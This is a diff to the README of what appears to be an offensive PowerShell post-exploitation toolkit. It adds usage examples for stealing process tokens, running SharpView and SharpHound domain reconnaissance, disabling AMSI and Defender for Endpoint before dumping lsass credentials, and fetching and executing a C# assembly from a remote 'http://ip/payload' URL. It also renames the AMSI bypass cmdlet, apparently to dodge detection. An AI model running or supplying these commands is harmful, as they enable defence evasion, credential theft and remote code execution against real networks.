@@ -29,20 +29,33 @@ foreach($h in $s){Invoke-AdminCheck -t $h}
 
 Invoke-AdminCheck -h $(Invoke-PingSweep -s "172.16.75.0")
 ```
-Example of impersonation via process token then running SharpView as that domain user
+Example of impersonation via process token then running SharpView (or sharphound) as that domain user
 ```powershell
 Invoke-TokenStealer -procH $false
 
 Get-CurrentIdentity
 
-Invoke-TurtleView -c "Get-DomainComputers"
+Invoke-TurtleView -c "Get-DomainComputers";
+Invoke-TurtleHound
 ```
+Example of disabling amsi then disabling defender for endpoint and performing lsass process dump
+```powershell
+Disable-AyEmEsEye -Verbose
+Disable-DefenderForEndpoint
+Invoke-TurtleDump
+Enable-DefenderForEndpint
 
+```
+Example of loading and executing a c# assembly
+```powershell
+Invoke-AssemblyLoader -e $false -l $false -path "http://ip/payload" -name namespace -clss targetclass -run method
+
+```
 
 ## List of cmdlets
 
 ```
-Disable-AMSI
+Disable-AyEmEsEye
 Disable-DefenderForEndpoint
 Disable-Etw
 Enable-DefenderForEndpoint
